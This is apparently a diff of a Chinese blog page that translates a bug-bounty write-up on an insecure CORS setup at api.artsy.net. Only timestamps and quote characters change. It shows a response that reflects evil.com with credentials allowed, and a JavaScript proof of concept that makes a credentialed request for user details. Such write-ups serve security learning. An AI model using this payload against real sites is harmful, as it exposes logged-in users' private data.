@@ -25,7 +25,7 @@
 <meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_10/1.png">
 <meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_10/3.png">
 <meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/translate_1/money.png">
-<meta property="og:updated_time" content="2018-12-27T07:42:27.835Z">
+<meta property="og:updated_time" content="2018-12-27T09:00:28.048Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="第十篇翻译：CORS跨域请求">
 <meta name="twitter:description" content="原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net漏洞：跨域请求作者：Muhammad Khizer Javed难度：低">
@@ -313,7 +313,7 @@
 <h4 id="emsp-正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞"><a href="#emsp-正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞" class="headerlink" title="&emsp;正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞"></a>&emsp;正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Access-Control-Allow-Credentials: true</div><div class="line">Access-Control-Allow-Origin: https://evil.com</div></pre></td></tr></table></figure>
 <h4 id="emsp-emsp-现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点"><a href="#emsp-emsp-现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点" class="headerlink" title="&emsp;&emsp;现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点"></a>&emsp;&emsp;现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://api.artsy.net/api/user_details/user</div></pre></td></tr></table></figure>
 <p>[*]payload代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">function cors() &#123;</div><div class="line">var xhttp = new XMLHttpRequest();</div><div class="line">xhttp.onreadystatechange = function() &#123;</div><div class="line">if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</div><div class="line">document.getElementById(“demo”).innerHTML =</div><div class="line">alert(this.responseText);</div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line">xhttp.open(“GET”, “https://api.artsy.net/api/user_details/&lt;User-ID&gt;”, true);</div><div class="line">xhttp.withCredentials = true;</div><div class="line">xhttp.send();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">function cors() &#123;</div><div class="line">var xhttp = new XMLHttpRequest();</div><div class="line">xhttp.onreadystatechange = function() &#123;</div><div class="line">if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</div><div class="line">document.getElementById(&quot;demo&quot;).innerHTML =</div><div class="line">alert(this.responseText);</div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line">xhttp.open(&quot;GET&quot;, &quot;https://api.artsy.net/api/user_details/&lt;User-ID&gt;&quot;, true);</div><div class="line">xhttp.withCredentials = true;</div><div class="line">xhttp.send();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_10/3.png" alt=""></p>
 <h2 id="视屏"><a href="#视屏" class="headerlink" title="视屏"></a>视屏</h2><video id="video" controls preload="none" poster="http://img5.imgtn.bdimg.com/it/u=750248180,3726006403&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_10/CORS.mp4" type="video/mp4"><br></video>
 
@@ -331,7 +331,7 @@
         <p><span>本文标题:</span><a href="/2018/12/23/第十篇翻译：CORS跨域请求/">第十篇翻译：CORS跨域请求</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
         <p><span>发布时间:</span>2018-12-23, 18:33:56</p>
-        <p><span>最后更新:</span>2018-12-27, 15:42:27</p>
+        <p><span>最后更新:</span>2018-12-27, 17:00:28</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/12/23/第十篇翻译：CORS跨域请求/" title="第十篇翻译：CORS跨域请求">http://TimeS0ng.github.io/2018/12/23/第十篇翻译：CORS跨域请求/</a>
             <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2018/12/23/第十篇翻译：CORS跨域请求/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
